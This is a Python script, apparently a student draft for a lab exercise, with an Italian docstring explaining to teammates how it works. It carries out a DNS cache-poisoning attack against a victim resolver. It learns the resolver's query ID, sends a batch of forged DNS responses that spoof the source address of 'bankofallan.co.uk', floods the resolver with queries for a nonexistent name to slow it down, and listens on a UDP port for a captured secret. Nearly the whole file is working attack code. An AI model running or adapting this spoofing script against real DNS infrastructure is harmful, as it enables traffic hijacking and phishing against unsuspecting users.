import socket
import threading
from dnslib import *
from scapy.all import *
import sys

'''
PER ANDREA E DANIELE - COME FUNZIONA IL CODICE (È UNA BOZZA)
 
Nella prima parte della funzione main si ricavano alcuni paramentri mancanti,
ovvero l'indirizzo ip del web server e l'indirizzo ip del dns autoritativo per il web sever,
(che nel nostro caso coincidono in quanto si appoggiano allo stesso server, ma non 
è necessariamente sempre così). Successivamente si creano tre thread affinche possano svolgersi
tre funzioni in contemporanea: "flood", "secret", "dos" (i nomi probabile andranno cambiati).

- la funzione "secret" apre una socket UDP sulla porta 1337 affinchè possa ricevere il segreto

- la funzione "dos" simula un Denial of Service mandando costantemente richieste al victim nameserver
  per un un dominio inesistente affinchè venga rallentanto il processo di creazione del QUID (ciò aumenta
  la probabilità di indovinare il quid)

- la funzione "flood" prende il QUID attuale (mandando prima una richiesta per "badgyu.ru", ovvero noi)
  e successivamente manda una serie di pacchetti spoofati che simula la riposta alla query bankofallan.co.uk
  (hanno come indirizzo sorgente quello di bankofallan, quindi sembra che vengano da li piuttosto che dal
  nostro pc)

  se tutto va bene il segreto viene stampato e i tre thread escono dal ciclo e si chiudono. Andranno
  modificate le variabili globali ed eliminate alcune rindondanze, ma a grandi linee dovremmo esserci.

  se volete testare su Linux:

  sudo apt install python3-dnslib
  sudo apt install python3-scapy

  (sono alcune librerie esterne che non fanno parte di quelle standard offerteci dal pitone, una volta installate
  questi comandi non serviranno più)

  per farlo girare

  . script.sh

  fatemi sapere se tutto gira, eventualmente utilizzare questo testo per fare una bozzetta nel report

'''

def question(domain, type=QTYPE.A, port=5555, dest_ip="192.168.56.101", quid=False):

    sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('0.0.0.0', port))

    question = DNSQuestion(domain,type)
    query = DNSRecord(q=question)

    sock.sendto(bytes(query.pack()),(dest_ip,53))
    data, addr = sock.recvfrom(1024)
    
    sock.close()
    
    if quid:
        quid = DNSRecord.parse(data).header.id
        return quid, addr[1]
    
    else:
        ip_res = DNSRecord.parse(data).a.rdata
        return str(ip_res)


def generate_packets(src_ip, dest_ip, source_p, queryPort, start, end, q, a=False):
    packets = []
    for i in range(start, end):
        question = DNSQR(qname=q) 
        answer = DNSRR(rrname=q + ".", type="A", rclass="IN", ttl=3600)

        packet = (
            IP(src=src_ip, dst=dest_ip) /
            UDP(sport=source_p, dport=queryPort) /
            DNS(id=i, qd=question, ar=answer)
        )
        packets.append(packet)
    return packets


def flood():
    increment = 5
    packetsToSend = 5

    while not received:
        queryID, queryPort = question(host_domain, port=55553, quid=True)
        start = queryID + increment
        end = start + packetsToSend
        packets = generate_packets(target_addr, victim_dns_addr, 53, queryPort, start, end, "abc.bankofallan.co.uk")
        for p in packets:
            send(p, verbose=0)


def dos():    
    while not received: 
        #packet = create_packets(host_dns_ip, victim_dns_addr, 55555, 53, 1, 2, "abc.bankofallan.co.uk")

        packet = (
            IP(src=host_dns_ip, dst=victim_dns_addr) /
            UDP(sport=55555, dport=53) /
            DNS(id = 111, rd = 1, qr =0, z = 0, qdcount = 1, qd=DNSRR(rrname = "abc.bankofallan.co.uk", type = "A", rclass="IN"))
        )
        send(packet, verbose=0)


def listerner():
    '''
    Create a UDP socket on the port 1337 and listen for the "secret". 
    '''
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('0.0.0.0', 1337))
    
    data, addr = sock.recvfrom(4096)

    global secret
    secret = str(data)

    global received
    received = True
    
    sock.close()


def usage():
    print("usage:", sys.argv[0], "<host_domain>", "<host_dns_addr>", "<victim_dns_addr>", "<target_domain>", "<fake_ip>")
    sys.exit(2)

if __name__=='__main__':
    if len(sys.argv) != 6:
        usage()
        
    host_domain = sys.argv[1]       # badguy.ru   
    host_dns_ip = sys.argv[2]       # 192.168.56.1     
    victim_dns_addr = sys.argv[3]   # 192.168.56.101               
    target_domain = sys.argv[4]     # bankofallan.co.uk
    fake_ip = sys.argv[5]           # 1.2.3.4

    target_addr = question(target_domain)
    target_dns_addr = question(target_domain, QTYPE.NS)

    secret = ''
    received = False

    threads = []
    threads.append(threading.Thread(target=listerner))
    threads.append(threading.Thread(target=dos))
    #threads.append(threading.Thread(target=flood, args=(target_addr, victim_dns_addr)))

    for t in threads:
        t.start()

    flood()

    print("The secret is:", secret)